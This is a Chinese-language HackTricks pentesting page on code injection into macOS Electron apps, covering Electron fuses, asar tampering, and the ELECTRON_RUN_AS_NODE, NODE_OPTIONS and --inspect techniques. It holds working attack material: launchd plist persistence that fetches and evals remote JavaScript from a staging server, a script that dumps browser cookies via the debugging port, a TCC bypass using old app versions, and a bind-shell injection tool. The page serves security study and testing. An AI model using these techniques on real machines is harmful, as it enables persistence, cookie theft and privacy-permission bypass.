# macOS Electron 应用程序注入

<details>

<summary><strong>从零到英雄学习 AWS 黑客攻击，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 **HackTricks 中看到您的公司广告** 或 **下载 HackTricks 的 PDF**，请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFT 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上 **关注** 我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>

## 基本信息

如果您不知道 Electron 是什么，您可以在[**这里找到大量信息**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps)。但现在只需知道 Electron 运行 **node**。\
并且 node 有一些 **参数** 和 **环境变量** 可以用来 **执行其他代码**，而不仅仅是指定的文件。

### Electron 保险丝

这些技术将在接下来讨论，但近来 Electron 添加了几个 **安全标志以防止它们**。这些是 [**Electron 保险丝**](https://www.electronjs.org/docs/latest/tutorial/fuses)，用于 **防止** macOS 中的 Electron 应用程序 **加载任意代码**：

* **`RunAsNode`**：如果禁用，它将阻止使用环境变量 **`ELECTRON_RUN_AS_NODE`** 来注入代码。
* **`EnableNodeCliInspectArguments`**：如果禁用，像 `--inspect`、`--inspect-brk` 这样的参数将不被尊重。避免了这种方式注入代码。
* **`EnableEmbeddedAsarIntegrityValidation`**：如果启用，macOS 将 **验证** 加载的 **`asar`** **文件**。这样可以 **防止** 通过修改此文件的内容来 **注入代码**。
* **`OnlyLoadAppFromAsar`**：如果启用，它将仅检查并使用 app.asar，而不是按以下顺序搜索加载：**`app.asar`**、**`app`** 最后是 **`default_app.asar`**。因此，当与 **`embeddedAsarIntegrityValidation`** 保险丝 **结合** 使用时，**不可能** **加载未经验证的代码**。
* **`LoadBrowserProcessSpecificV8Snapshot`**：如果启用，浏览器进程将使用名为 `browser_v8_context_snapshot.bin` 的文件作为其 V8 快照。

另一个有趣但不会防止代码注入的保险丝是：

* **EnableCookieEncryption**：如果启用，磁盘上的 cookie 存储将使用操作系统级别的加密密钥进行加密。

### 检查 Electron 保险丝

您可以使用以下命令从应用程序**检查这些标志**：
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### 修改 Electron Fuses

正如[**文档提到的**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode)，**Electron Fuses** 的配置位于 **Electron 二进制文件**中，其中包含字符串 **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**。

在 macOS 应用程序中，这通常位于 `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
您可以在 [https://hexed.it/](https://hexed.it/) 中加载此文件，并搜索前面的字符串。在这个字符串之后，您可以在ASCII中看到一个数字“0”或“1”，表示每个保险丝是禁用还是启用的。只需修改十六进制代码（`0x30` 是 `0`，`0x31` 是 `1`），以**修改保险丝值**。

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

请注意，如果您尝试用这些修改过的字节**覆盖**应用程序中的**`Electron Framework` 二进制文件**，应用程序将无法运行。

## 向 Electron 应用程序添加代码实现 RCE

Electron 应用程序可能会使用**外部 JS/HTML 文件**，因此攻击者可以在这些文件中注入代码，这些文件的签名不会被检查，并且可以在应用程序的上下文中执行任意代码。

{% hint style="danger" %}
然而，目前有两个限制：

* 修改应用程序需要**`kTCCServiceSystemPolicyAppBundles`** 权限，所以默认情况下这是不可能的。
* 编译的 **`asap`** 文件通常启用了保险丝 **`embeddedAsarIntegrityValidation`** `和` **`onlyLoadAppFromAsar`**

这使得攻击路径更加复杂（或不可能）。
{% endhint %}

请注意，通过将应用程序复制到另一个目录（如 **`/tmp`**），将文件夹 **`app.app/Contents`** 重命名为 **`app.app/NotCon`**，**修改**带有**恶意**代码的 **asar** 文件，然后将其重命名回 **`app.app/Contents`** 并执行它，可以绕过**`kTCCServiceSystemPolicyAppBundles`** 的要求。

您可以使用以下命令从 asar 文件中解包代码：
```bash
npx asar extract app.asar app-decomp
```
```plaintext
修改后重新打包：
```
```bash
npx asar pack app-decomp app-new.asar
```
## 利用 `ELECTRON_RUN_AS_NODE` 实现远程代码执行 <a href="#electron_run_as_node" id="electron_run_as_node"></a>

根据[**官方文档**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node)，如果设置了这个环境变量，它将启动进程作为一个普通的Node.js进程。

{% code overflow="wrap" %}
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
如果 **`RunAsNode`** 的保险丝被禁用，环境变量 **`ELECTRON_RUN_AS_NODE`** 将被忽略，这将不起作用。
{% endhint %}

### 从应用 Plist 中注入

正如[**这里提出的**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/)，你可以在 plist 中滥用这个环境变量来维持持久性：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## 利用 `NODE_OPTIONS` 进行远程代码执行（RCE）

您可以将有效载荷存储在一个不同的文件中并执行它：

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
如果 fuse **`EnableNodeOptionsEnvironmentVariable`** 被**禁用**，除非设置了环境变量 **`ELECTRON_RUN_AS_NODE`**，否则应用在启动时会**忽略**环境变量 **NODE\_OPTIONS**。如果 fuse **`RunAsNode`** 被禁用，即使设置了 **`ELECTRON_RUN_AS_NODE`** 也会被**忽略**。

如果你没有设置 **`ELECTRON_RUN_AS_NODE`**，你会遇到**错误**：`Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
{% endhint %}

### 通过应用 Plist 的注入

你可以在 plist 中滥用这个环境变量，通过添加这些键来维持持久性：
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE 通过检查

根据[**这篇文章**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)，如果你使用如 **`--inspect`**、**`--inspect-brk`** 和 **`--remote-debugging-port`** 这样的标志执行一个Electron应用程序，一个**调试端口将会开放**，你可以连接到它（例如通过Chrome在 `chrome://inspect` 中），并且你将能够**在其上注入代码**或甚至启动新的进程。\
例如：

{% code overflow="wrap" %}
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
如果 fuse **`EnableNodeCliInspectArguments`** 被禁用，应用程序将在启动时**忽略 node 参数**（例如 `--inspect`），除非设置了环境变量 **`ELECTRON_RUN_AS_NODE`**，如果 fuse **`RunAsNode`** 被禁用，该环境变量也将被**忽略**。

然而，你仍然可以使用 **electron 参数 `--remote-debugging-port=9229`**，但之前的有效载荷将无法用来执行其他进程。
{% endhint %}

使用参数 **`--remote-debugging-port=9222`** 可以从 Electron 应用程序中窃取一些信息，如**历史记录**（通过 GET 命令）或浏览器的**cookies**（因为它们在浏览器内部被**解密**，并且有一个**json 端点**会提供它们）。

你可以在[**这里**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)和[**这里**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)学习如何做到这一点，并使用自动工具 [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) 或一个简单的脚本，如：
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
在[**这篇博客文章**](https://hackerone.com/reports/1274695)中，这种调试被滥用来让无头Chrome **在任意位置下载任意文件**。

### 从应用Plist中注入

你可以在plist中滥用这个环境变量，通过添加这些键来维持持久性：
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## 利用旧版本绕过 TCC

{% hint style="success" %}
macOS 的 TCC 守护进程不会检查应用程序执行的版本。因此，如果您**无法使用前述技术在 Electron 应用程序中注入代码**，您可以下载该应用的旧版本并在其上注入代码，因为它仍将获得 TCC 权限（除非 Trust Cache 阻止了这一点）。
{% endhint %}

## 运行非 JS 代码

前述技术将允许您在 Electron 应用程序的进程中运行**JS 代码**。然而，请记住，**子进程将在与父应用程序相同的沙箱配置文件下运行**并**继承它们的 TCC 权限**。\
因此，如果您想滥用权限来访问相机或麦克风，例如，您可以简单地**从进程中运行另一个二进制文件**。

## 自动注入

工具 [**electroniz3r**](https://github.com/r3ggi/electroniz3r) 可以轻松用于**查找已安装的易受攻击 Electron 应用程序**并在它们上面注入代码。此工具将尝试使用 **`--inspect`** 技术：

您需要自己编译它，并可以像这样使用它：
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## 参考资料

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习AWS黑客攻击直至成为高手！</strong></summary>

支持HackTricks的其他方式：

* 如果您希望在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
